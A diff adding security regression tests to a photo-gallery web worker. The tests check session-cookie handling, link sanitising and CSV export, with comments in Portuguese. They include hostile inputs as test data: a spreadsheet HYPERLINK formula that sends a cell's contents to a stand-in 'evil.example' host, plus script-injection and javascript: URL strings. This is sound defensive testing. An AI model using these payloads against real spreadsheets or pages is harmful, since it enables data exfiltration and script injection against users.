@@ -13,9 +13,9 @@ import {
   generateNonce, contentSecurityPolicy, htmlSecurityHeaders, adminHtmlSecurityHeaders,
   dataSecurityHeaders, honeypotTripped, honeypotFieldHTML, HONEYPOT_FIELD,
 } from '../src/security.js';
-import { csvCell, stripImageMetadata, bytesFromBase64, base64FromBytes, sessionCookie, clientFingerprint, TERMS_VERSION, verifySession, readCounter, verifyPassword, hashPassword } from '../src/utils.js';
+import { csvCell, stripImageMetadata, bytesFromBase64, base64FromBytes, sessionCookie, sessionTokenFromCookie, clientFingerprint, TERMS_VERSION, verifySession, readCounter, verifyPassword, hashPassword, escape, toHttps, eventTime } from '../src/utils.js';
 import { withDurableObjects } from './helpers/do.js';
-import worker, { sanitizeRestoredRequest, signingSecretProblem, mintFormToken, trimRequests } from '../src/index.js';
+import worker, { sanitizeRestoredRequest, signingSecretProblem, mintFormToken, trimRequests, handleLogout, handleChangePassword } from '../src/index.js';
 import { FORM_TOKEN_TTL_SECS, FORM_TOKEN_MIN_AGE_SECS, SIGNING_SECRET_MIN_LENGTH } from '../src/config.js';
 import { renderMarkdown, resolveDocHref } from '../src/ui/markdown.js';
 import { eventHTML } from '../src/ui/event.js';
@@ -1305,6 +1305,72 @@ describe('precedência do cookie de sessão', () => {
     const env = { FOTOS: kv({ [`admin_session:${TOKEN_NOVO}`]: sessaoValida() }) };
     expect(await verifySession(env, req(`session=${TOKEN_NOVO}`))).toBe(true);
   });
+
+  // ------------------------------------------------------------------------
+  // A correção acima chegou só ao verifySession. O logout e a troca de senha
+  // ficaram com o padrão único `(?:__Host-)?session=`, então os TRÊS
+  // discordavam sobre qual token o pedido apresentava — e são os três que
+  // decidem o destino da mesma sessão. Os testes abaixo afirmam a concordância,
+  // não a implementação: é a divergência entre leitores que já custou duas
+  // regressões, e ela volta na hora em que alguém reescrever um regex sozinho.
+  // ------------------------------------------------------------------------
+  it('o leitor único resolve o mesmo token para todos os chamadores', () => {
+    const cookie = `session=${TOKEN_LIXO}; __Host-session=${TOKEN_NOVO}`;
+    expect(sessionTokenFromCookie(cookie)).toBe(TOKEN_NOVO);
+    // Ordem no cabeçalho não pode mudar a resposta.
+    expect(sessionTokenFromCookie(`__Host-session=${TOKEN_NOVO}; session=${TOKEN_LIXO}`)).toBe(TOKEN_NOVO);
+    // Sem `__Host-`, o legado ainda vale.
+    expect(sessionTokenFromCookie(`session=${TOKEN_NOVO}`)).toBe(TOKEN_NOVO);
+    // Sem cookie de sessão nenhum.
+    expect(sessionTokenFromCookie('outra=coisa')).toBe(null);
+    expect(sessionTokenFromCookie('')).toBe(null);
+  });
+
+  // O delete do logout É a revogação (ver SECURITY.md). Apagando o registro do
+  // cookie legado, o cookie saía do browser mas o token de verdade seguia
+  // aceito até o TTL de 24 h — logout que diz ter saído e não revoga nada.
+  it('logout revoga a sessão do __Host-, não a do cookie legado plantado', async () => {
+    const store = kv({
+      [`admin_session:${TOKEN_NOVO}`]: sessaoValida(),
+      [`admin_session:${TOKEN_LIXO}`]: sessaoValida(),
+    });
+    await handleLogout(
+      new Request('https://fotos.lucafchala.com/dashboard/logout', {
+        method: 'POST',
+        headers: { Cookie: `session=${TOKEN_LIXO}; __Host-session=${TOKEN_NOVO}` },
+      }),
+      { FOTOS: store },
+      { waitUntil() {} },
+    );
+    expect(store._store.has(`admin_session:${TOKEN_NOVO}`), 'a sessão real tem de ser revogada').toBe(false);
+  });
+
+  // Espelho do anterior: a varredura preservava o token apontado pelo cookie
+  // legado e apagava o do próprio admin — trocar a senha deslogava quem trocou.
+  it('a troca de senha preserva a sessão do __Host-, não a do cookie legado', async () => {
+    const store = kv({
+      admin_password: 'pbkdf2:1:00:00',
+      [`admin_session:${TOKEN_NOVO}`]: sessaoValida(),
+      [`admin_session:${TOKEN_LIXO}`]: sessaoValida(),
+    });
+    store.list = async () => ({
+      keys: [{ name: `admin_session:${TOKEN_NOVO}` }, { name: `admin_session:${TOKEN_LIXO}` }],
+      list_complete: true,
+    });
+    const cookie = `session=${TOKEN_LIXO}; __Host-session=${TOKEN_NOVO}`;
+    const res = await handleChangePassword(
+      new Request('https://fotos.lucafchala.com/api/settings/password', {
+        method: 'PUT',
+        headers: { Cookie: cookie, 'Content-Type': 'application/json', 'User-Agent': 'ua-de-teste' },
+        body: JSON.stringify({ password: 'uma-senha-longa-e-boa-42' }),
+      }),
+      { FOTOS: store },
+      { waitUntil() {} },
+    );
+    expect(res.status).toBe(200);
+    expect(store._store.has(`admin_session:${TOKEN_NOVO}`), 'a sessão de quem trocou a senha sobrevive').toBe(true);
+    expect(store._store.has(`admin_session:${TOKEN_LIXO}`), 'a sessão do cookie plantado é revogada').toBe(false);
+  });
 });
 
 describe('anexo de remoção: o portão é a capacidade de limpar', () => {
@@ -1477,6 +1543,32 @@ describe('markdown: URL protocol-relative não é caminho interno', () => {
     expect(html).not.toContain('<a ');
     expect(html).not.toContain('//exemplo.com');
     expect(html).toContain('isto');
+  });
+
+  // A guarda acima ficava para trás no caminho de "mesmo host": um link
+  // absoluto para o nosso domínio com barra dupla no caminho volta como
+  // `url.pathname`, e `new URL('https://fotos.lucafchala.com//evil/x').pathname`
+  // é "//evil/x" — o mesmo href protocol-relative, reintroduzido pela porta dos
+  // fundos, que o browser resolve como https://evil/x. Duas checagens da mesma
+  // regra, e a segunda não sabia da primeira.
+  it('não deixa o caminho do próprio host virar URL protocol-relative', () => {
+    expect(resolveDocHref('https://fotos.lucafchala.com//exemplo.com/x')).toBe('/exemplo.com/x');
+    expect(resolveDocHref('https://fotos.lucafchala.com////exemplo.com')).toBe('/exemplo.com');
+    // O caminho normal do mesmo host continua intacto.
+    expect(resolveDocHref('https://fotos.lucafchala.com/privacidade')).toBe('/privacidade');
+    expect(resolveDocHref('https://fotos.lucafchala.com/')).toBe('/');
+  });
+
+  // Indexar o mapa sem Object.hasOwn achava os membros do Object.prototype: um
+  // link para `constructor` era truthy e virava
+  // "/legal/function Object() { [native code] }". É o mesmo cuidado que o
+  // `?tema=` do /suporte já tomava em index.js — faltava aqui.
+  it('não resolve chave herdada do Object.prototype como documento', () => {
+    for (const chave of ['constructor', 'toString', '__proto__', 'hasOwnProperty', 'valueOf']) {
+      expect(resolveDocHref(chave), chave).toBeNull();
+    }
+    // E um documento de verdade continua resolvendo.
+    expect(resolveDocHref('ROPA.md')).toBe('/legal/registro-de-operacoes');
   });
 });
 
@@ -1742,5 +1834,274 @@ describe('auditoria: sitemap é XML, e XML quebra com & solto', () => {
     // Nenhum `&` cru sobrou fora de uma entidade — que é a condição de o
     // documento ser XML válido.
     expect(xml).not.toMatch(/&(?!amp;|lt;|gt;|quot;|#x27;)/);
+  });
+});
+
+// ---------------------------------------------------------------------------
+describe('export de CSV do navegador: mesma defesa do servidor', () => {
+  // O `csvCell()` do servidor (testado lá em cima) neutraliza injeção de
+  // fórmula, mas quem baixa "solicitações de remoção" e "métricas" no painel
+  // passa pelo `toCSV()` que vive DENTRO do template literal de dashboard.js —
+  // fora do alcance do lint, do tsc e de qualquer import. Ele fazia só a
+  // citação de CSV enquanto o comentário dizia "matches server", e é justamente
+  // o export do navegador que carrega `message` e `value`: texto cru do
+  // visitante, aberto pelo dono numa planilha com dados pessoais na tela.
+  //
+  // O teste EXTRAI a função do template e a executa, em vez de procurar uma
+  // string na fonte: uma guarda que casa com o texto mas não com o
+  // comportamento é a guarda que continua passando depois de alguém quebrá-la.
+  const dashboardSource = readFileSync(new URL('../src/ui/dashboard.js', import.meta.url), 'utf8');
+
+  function browserToCSV() {
+    const m = dashboardSource.match(/function toCSV\(cols, rows\)\{[\s\S]*?\n {4}\}/);
+    if (!m) throw new Error('toCSV não encontrado em dashboard.js — o teste precisa ser reapontado');
+    // Dentro do template literal toda barra invertida está dobrada.
+    return new Function(`${m[0].replace(/\\\\/g, '\\')}; return toCSV;`)();
+  }
+
+  // \uFEFF por código-ponto: o BOM colado é whitespace irregular (o lint
+  // reprova) e invisível no editor, que é como ele entra sem ninguém ver.
+  const linhas = out => out.replace(/^\uFEFF/, '').split('\r\n');
+
+  it('prefixa a célula que a planilha executaria', () => {
+    const toCSV = browserToCSV();
+    for (const gatilho of ['=', '+', '-', '@', '\t', '\r']) {
+      const [, celula] = linhas(toCSV(['v'], [{ v: `${gatilho}CMD` }]));
+      expect(celula.replace(/^"/, ''), `gatilho ${JSON.stringify(gatilho)}`).toMatch(/^'/);
+    }
+  });
+
+  it('neutraliza o HYPERLINK que exfiltra a linha ao lado', () => {
+    const toCSV = browserToCSV();
+    const ataque = '=HYPERLINK("https://evil.example/?x="&A1,"clique aqui")';
+    const [, celula] = linhas(toCSV(['message'], [{ message: ataque }]));
+    expect(celula).toMatch(/^"'=HYPERLINK/);
+  });
+
+  it('mantém idêntico o resultado do servidor para os mesmos valores', () => {
+    // A afirmação que importa não é "o cliente escapa", é "os dois concordam":
+    // divergência entre duas cópias da mesma regra é o defeito de origem aqui.
+    const toCSV = browserToCSV();
+    const amostras = [
+      'Maria Silva', 'casamento-ana-joao', '', 'a,b', 'diz "oi"',
+      '=SUM(A1:A9)', '+55 11 99999-9999', '-1', '@canal',
+      'com\x00nulo', 'com\x07sino', 'linha\ncom quebra',
+    ];
+    for (const v of amostras) {
+      const [, doCliente] = linhas(toCSV(['v'], [{ v }]));
+      expect(doCliente, `valor ${JSON.stringify(v)}`).toBe(csvCell(v));
+    }
+  });
+
+  it('guarda também a linha de cabeçalho', () => {
+    const toCSV = browserToCSV();
+    expect(linhas(toCSV(['=evil'], []))[0]).toBe("'=evil");
+  });
+});
+
+// ---------------------------------------------------------------------------
+describe('pedido de remoção sem createdAt não derruba a listagem', () => {
+  // `sanitizeRestoredRequest` só copia `createdAt` quando ele vem como string,
+  // então um backup adulterado (ou de uma versão antiga) produz um registro
+  // válido e SEM data. O `b.createdAt.localeCompare(...)` que ordenava a lista
+  // lançava TypeError nesse registro — e o catch-all do fetch() transformava um
+  // registro ruim na perda da aba inteira de solicitações.
+  const TOKEN = 'c'.repeat(64);
+
+  function kv(pedidos) {
+    const store = new Map(Object.entries({
+      removal_requests: typeof pedidos === 'string' ? pedidos : JSON.stringify(pedidos),
+      [`admin_session:${TOKEN}`]: JSON.stringify({ createdAt: Date.now(), lastSeen: Date.now() }),
+    }));
+    return { async get(k) { return store.has(k) ? store.get(k) : null; },
+      async put(k, v) { store.set(k, v); }, async delete(k) { store.delete(k); },
+      async list() { return { keys: [], list_complete: true }; }, _store: store };
+  }
+  const listar = env => worker.fetch(
+    new Request('https://fotos.lucafchala.com/api/removal-requests', { headers: { Cookie: `__Host-session=${TOKEN}` } }),
+    env, { waitUntil: () => {} },
+  );
+
+  it('lista sem lançar e joga o registro sem data para o fim', async () => {
+    const env = withDurableObjects({ FOTOS: kv([
+      { id: 'sem-data', eventSlug: 'x' },
+      { id: 'com-data', eventSlug: 'y', createdAt: '2026-01-01T00:00:00Z' },
+    ]) });
+    const res = await listar(env);
+    expect(res.status, 'um registro sem data não pode virar 500').toBe(200);
+    expect((await res.json()).map(r => r.id)).toEqual(['com-data', 'sem-data']);
+  });
+
+  it('trata um valor corrompido em KV como lista vazia, não como exceção', async () => {
+    // Mesmo portão de forma que `parseEvents()` faz para os eventos: o valor
+    // pode vir de um restore, e `JSON.parse` cru devolvia o que estivesse lá —
+    // um objeto quebrava com ".filter is not a function" DENTRO do POST público
+    // de remoção, que é canal de direito do titular.
+    for (const corrompido of ['{"nao":"array"}', '"texto"', '123', 'nao-e-json']) {
+      const env = withDurableObjects({ FOTOS: kv(corrompido) });
+      const res = await listar(env);
+      expect(res.status, `valor ${corrompido}`).toBe(200);
+      expect(await res.json()).toEqual([]);
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+describe('corpo JSON que é JSON válido mas não é objeto', () => {
+  // `request.json()` só LANÇA quando o texto não é JSON. `null`, `42` e `"oi"`
+  // passavam pelo catch, e a primeira leitura de propriedade lançava TypeError
+  // já dentro do handler — capturado só pelo catch-all do fetch(), que responde
+  // 500 E dispara o e-mail de alerta. Quatro bytes anônimos (`null`) num POST
+  // viravam 500 e queimavam a janela de 15 min do alerta, escondendo a próxima
+  // falha de verdade.
+  const ctx = { waitUntil: () => {} };
+  function kv() {
+    const store = new Map([['events', JSON.stringify([
+      { id: 'a', slug: 'evento', title: 'E', visible: true, driveUrl: 'https://drive.google.com/x' },
+    ])]]);
+    return { async get(k) { return store.has(k) ? store.get(k) : null; },
+      async put(k, v) { store.set(k, v); }, async delete(k) { store.delete(k); },
+      async list() { return { keys: [], list_complete: true }; } };
+  }
+  const post = (path, corpo) => worker.fetch(
+    new Request(`https://fotos.lucafchala.com${path}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'same-origin' },
+      body: corpo,
+    }),
+    withDurableObjects({ FOTOS: kv() }), ctx,
+  );
+
+  for (const corpo of ['null', '42', '"texto"', '[]', 'true']) {
+    it(`responde 4xx (nunca 5xx) para o corpo ${corpo}`, async () => {
+      for (const rota of ['/api/drive-link', '/api/removal-request']) {
+        const res = await post(rota, corpo);
+        expect(res.status, `${rota} com ${corpo}`).toBeLessThan(500);
+      }
+    });
+  }
+
+  it('/api/track-drive continua respondendo 200 — métrica não mostra erro', async () => {
+    const res = await post('/api/track-drive', 'null');
+    expect(res.status).toBe(200);
+  });
+
+  it('/api/perf continua respondendo 204', async () => {
+    const res = await post('/api/perf', 'null');
+    expect(res.status).toBe(204);
+  });
+});
+
+// ---------------------------------------------------------------------------
+describe('pares cliente/servidor: as duas cópias têm de concordar', () => {
+  // A auditoria que o TODO.md pedia, virada em teste permanente.
+  //
+  // O painel reimplementa à mão funções que já existem em `utils.js`, porque o
+  // browser não tem `import` para dentro de um template literal. Isso é aceito;
+  // o que não é aceito é as duas versões DIVERGIREM sem ninguém notar — foi
+  // assim que a defesa contra injeção de fórmula do CSV ficou faltando só no
+  // navegador, e assim que o leitor do cookie de sessão passou a ler tokens
+  // diferentes em três lugares.
+  //
+  // Hoje elas concordam. Este bloco é o que faz continuarem concordando: extrai
+  // cada função de dentro do template e a executa lado a lado com a do
+  // servidor. Afirma a CONCORDÂNCIA, não o comportamento de uma delas — a
+  // versão que só testa o servidor é a que já deixou passar os dois defeitos
+  // acima.
+  const dashboardSource = readFileSync(new URL('../src/ui/dashboard.js', import.meta.url), 'utf8');
+
+  /** Extrai uma função do template literal e a devolve executável. */
+  function doPainel(nome, re) {
+    const m = dashboardSource.match(re);
+    if (!m) throw new Error(`${nome} não encontrada em dashboard.js — o teste precisa ser reapontado`);
+    // Dentro do template literal toda barra invertida está dobrada.
+    return new Function(`${m[0].replace(/\\\\/g, '\\')}; return ${nome};`)();
+  }
+
+  it('esc() do painel devolve o mesmo que escape() de utils.js', () => {
+    const esc = doPainel('esc', /function esc\(s\) \{[\s\S]*?\n {4}\}/);
+    const entradas = [
+      'Maria', '<script>alert(1)</script>', 'a & b', 'aspa " dupla', "aspa ' simples",
+      '<>&"\'', '', 'já escapado &amp;', 'emoji 🎉', 'acentuação çãé',
+      // Os não-strings importam: `esc(0)` tem de virar "0" e não "" — uma
+      // checagem de truthiness aqui apagaria a coluna "0 visitas".
+      0, 42, null, undefined, true, false, -1,
+    ];
+    for (const v of entradas) expect(esc(v), `entrada ${JSON.stringify(v)}`).toBe(escape(v));
+  });
+
+  it('safeUrl() do painel devolve o mesmo que toHttps() de utils.js', () => {
+    const safeUrlPainel = doPainel('safeUrl', /function safeUrl\(u\) \{[\s\S]*?\n {4}\}/);
+    const entradas = [
+      'https://ok.example/x', 'http://ok.example/x', 'javascript:alert(1)',
+      'JavaScript:alert(1)', 'data:text/html,x', '//exemplo.com/x', '',
+      'HTTPS://MAIUSCULO.example/x', 'https://', 'ftp://x',
+      ' https://com-espaco.example', 'HtTp://misto.example/x',
+      'https://x/" onload="alert(1)', 'httpss://quase.example', 'http://',
+      'https:/uma-barra.example', null, undefined, 42,
+    ];
+    for (const v of entradas) expect(safeUrlPainel(v), `entrada ${JSON.stringify(v)}`).toBe(toHttps(v));
+  });
+
+  it('byDate() do painel ordena igual a eventTime() de utils.js', () => {
+    const byDate = new Function(
+      `${dashboardSource.match(/const byDate = [^;]+;/)[0].replace(/\\\\/g, '\\')} return byDate;`)();
+    const eventos = [
+      { date: '2026-01-15' }, { createdAt: '2025-06-01T00:00:00Z' },
+      { date: '', createdAt: '2025-06-01T00:00:00Z' }, {},
+      { date: '2026-01-15', createdAt: '2020-01-01T00:00:00Z' },
+      { date: 'lixo' }, { createdAt: 'lixo' }, { date: null, createdAt: null },
+    ];
+    for (const e of eventos) {
+      const doPainelValor = byDate(e);
+      const doServidor = eventTime(e);
+      // NaN !== NaN, e os dois lados produzem NaN para data ilegível — o que
+      // interessa é que produzam a MESMA coisa, inclusive o NaN.
+      const concordam = Object.is(doPainelValor, doServidor);
+      expect(concordam, `evento ${JSON.stringify(e)}: painel=${doPainelValor} servidor=${doServidor}`).toBe(true);
+    }
+  });
+
+  it('convertDriveUrl() só produz URL que o servidor aceita', () => {
+    // Esta não tem par no servidor: o painel converte o link do Drive para a
+    // forma do lh3 antes de enviar. O contrato que importa é que tudo que ela
+    // produz sobreviva ao `toHttps()` do servidor — senão o painel salvaria um
+    // link que a página pública descarta, e o dono só descobriria pela galeria
+    // sem capa.
+    const convertDriveUrl = doPainel('convertDriveUrl', /function convertDriveUrl\(url\) \{[\s\S]*?\n {4}\}/);
+    const reconhecidas = [
+      'https://drive.google.com/file/d/ABC123/view',
+      'https://drive.google.com/open?id=ABC123',
+      'https://drive.google.com/uc?export=view&id=ABC123',
+      'https://lh3.googleusercontent.com/d/ABC123',
+      'http://drive.google.com/file/d/ABC123/view',
+    ];
+    for (const v of reconhecidas) {
+      const convertido = convertDriveUrl(v);
+      expect(toHttps(convertido), `${v} vira um link que o servidor descarta`).toBe(convertido);
+    }
+    // E o que ela NÃO reconhece passa intacto, para o servidor cortar — que é o
+    // lugar certo para a decisão, não o cliente.
+    for (const hostil of ['javascript:alert(1)', 'nao-e-url', 'data:text/html,x']) {
+      expect(toHttps(convertDriveUrl(hostil)), hostil).toBe('');
+    }
+  });
+
+  it('a validação de e-mail e telefone é a mesma nos dois lados', () => {
+    // Aqui as duas cópias são regex escritas à mão em arquivos diferentes
+    // (event.js dentro do template, index.js no handler). Divergir não abre
+    // buraco de segurança — o servidor é quem decide —, mas abre o pior tipo de
+    // atrito: o formulário aceita e o servidor recusa, ou o contrário, sem
+    // mensagem que explique.
+    const emailCliente = eventSource.match(/\/(\^\[\^\\\\s@\]\+@\[\^\\\\s@\]\+\\\\\.\[\^\\\\s@\]\{2,\}\$)\//);
+    const emailServidor = indexSource.match(/\/(\^\[\^\\s@\]\+@\[\^\\s@\]\+\\\.\[\^\\s@\]\{2,\}\$)\//);
+    expect(emailCliente, 'regex de e-mail do cliente não encontrada').not.toBeNull();
+    expect(emailServidor, 'regex de e-mail do servidor não encontrada').not.toBeNull();
+    // Desdobra o escape do template literal e compara os padrões.
+    expect(emailCliente[1].replace(/\\\\/g, '\\')).toBe(emailServidor[1]);
+
+    // Telefone: mesma faixa de dígitos dos dois lados.
+    expect(eventSource).toContain('phoneDigits.length < 10 || phoneDigits.length > 13');
+    expect(indexSource).toContain('phoneDigits.length < 10 || phoneDigits.length > 13');
   });
 });
